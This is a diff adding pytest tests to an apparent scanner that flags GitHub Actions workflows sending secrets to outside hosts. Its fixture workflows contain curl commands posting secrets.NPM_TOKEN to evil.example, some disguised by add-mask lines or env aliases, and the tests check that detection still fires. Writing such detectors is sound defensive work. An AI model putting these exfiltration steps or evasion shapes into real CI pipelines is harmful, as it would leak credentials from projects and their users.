@@ -293,8 +293,8 @@ def test_mask_one_secret_does_not_suppress_unmasked_secret(
     mask in the body suppressed ALL findings for that body, so
     TOKEN_B leaked silently.
 
-    After fix: only the specific masked secret names are suppressed;
-    unmasked secrets still emit findings."""
+    After fix: only the mask OCCURRENCES themselves are exempt;
+    every other secret reference in the body still emits findings."""
     _write_wf(tmp_path, "wf.yml", """\
 on: push
 jobs:
@@ -315,3 +315,134 @@ jobs:
     hit_text = " ".join(str(h) for h in run_hits)
     # TOKEN_A should NOT be in a finding (it was properly masked).
     assert "TOKEN_A" not in hit_text or "TOKEN_B" in hit_text
+
+
+# ---------------------------------------------------------------------------
+# YAML scalar types that are not JSON-serialisable must not kill the scan
+# ---------------------------------------------------------------------------
+
+
+def test_date_scalar_in_step_scans_cleanly_and_sinks_still_fire(
+    tmp_path: Path,
+) -> None:
+    """An unquoted ``since: 2024-01-01`` parses to ``datetime.date``;
+    the step-serialisation ``json.dumps`` must degrade it to a string
+    rather than raise TypeError (which would abort the whole scan on
+    one benign workflow line).  The exfil sink elsewhere in the SAME
+    workflow must still be detected."""
+    _write_wf(tmp_path, "wf.yml", """\
+on: push
+jobs:
+  j:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: some/stale-action@v1
+        with:
+          since: 2024-01-01
+      - run: curl https://evil.example/?t=${{ secrets.NPM_TOKEN }}
+""")
+    hits = scan_target(tmp_path, [], [])          # must not raise
+    run_hits = [h for h in hits if h.sink_kind == "run_block"]
+    assert len(run_hits) == 1
+    assert run_hits[0].secret_names == ("NPM_TOKEN",)
+
+
+# ---------------------------------------------------------------------------
+# add-mask exempts only the mask occurrence, never the secret itself
+# ---------------------------------------------------------------------------
+
+
+def test_mask_does_not_cover_other_references_to_same_secret(
+    tmp_path: Path,
+) -> None:
+    """``add-mask`` hides the value from LOG OUTPUT only.  A body
+    that masks a secret AND ALSO posts it to an external host must
+    fire on the post — otherwise adding a mask line is free cover
+    for exfiltrating that very secret.  (The mask-only shape staying
+    quiet is covered by ``test_mask_in_run_body_suppresses``.)"""
+    _write_wf(tmp_path, "wf.yml", """\
+on: push
+jobs:
+  j:
+    runs-on: ubuntu-latest
+    steps:
+      - run: |
+          echo "::add-mask::${{ secrets.NPM_TOKEN }}"
+          curl -d t=${{ secrets.NPM_TOKEN }} https://evil.example
+""")
+    hits = scan_target(tmp_path, [], [])
+    run_hits = [h for h in hits if h.sink_kind == "run_block"]
+    assert len(run_hits) == 1
+    assert run_hits[0].secret_names == ("NPM_TOKEN",)
+    assert run_hits[0].severity == "high"         # curl egress shape
+
+
+def test_mask_then_env_alias_of_same_secret_still_fires(
+    tmp_path: Path,
+) -> None:
+    """Masking a secret must not silence a $VAR reference whose env
+    binding derives from that same secret."""
+    _write_wf(tmp_path, "wf.yml", """\
+on: push
+jobs:
+  j:
+    runs-on: ubuntu-latest
+    env:
+      TOK: ${{ secrets.NPM_TOKEN }}
+    steps:
+      - run: |
+          echo "::add-mask::${{ secrets.NPM_TOKEN }}"
+          curl https://evil.example/?t=$TOK
+""")
+    hits = scan_target(tmp_path, [], [])
+    run_hits = [h for h in hits if h.sink_kind == "run_block"]
+    assert len(run_hits) == 1
+    assert run_hits[0].secret_names == ("NPM_TOKEN",)
+
+
+# ---------------------------------------------------------------------------
+# Workflow-root env: bindings feed the per-job taint context
+# ---------------------------------------------------------------------------
+
+
+def test_workflow_root_env_secret_binding_fires(tmp_path: Path) -> None:
+    """``env:`` at the workflow ROOT is the most common place a
+    secret gets bound to an env name; a ``$TOKEN`` use in any job's
+    run body must taint exactly like a job-level binding (hoisting
+    the binding one level must not evade detection)."""
+    _write_wf(tmp_path, "wf.yml", """\
+on: push
+env:
+  TOKEN: ${{ secrets.NPM_TOKEN }}
+jobs:
+  j:
+    runs-on: ubuntu-latest
+    steps:
+      - run: curl https://evil.example/?t=$TOKEN
+""")
+    hits = scan_target(tmp_path, [], [])
+    run_hits = [h for h in hits if h.sink_kind == "run_block"]
+    assert len(run_hits) == 1
+    assert run_hits[0].secret_names == ("NPM_TOKEN",)
+
+
+def test_job_env_plain_value_shadows_workflow_root_secret(
+    tmp_path: Path,
+) -> None:
+    """Precedence is step > job > workflow: a job-level PLAIN value
+    for the same name genuinely replaces the workflow-level secret
+    binding, so the job's ``$TOKEN`` is not a secret reference."""
+    _write_wf(tmp_path, "wf.yml", """\
+on: push
+env:
+  TOKEN: ${{ secrets.NPM_TOKEN }}
+jobs:
+  j:
+    runs-on: ubuntu-latest
+    env:
+      TOKEN: public-value
+    steps:
+      - run: curl https://example.com/?t=$TOKEN
+""")
+    hits = scan_target(tmp_path, [], [])
+    assert [h for h in hits if h.sink_kind == "run_block"] == []
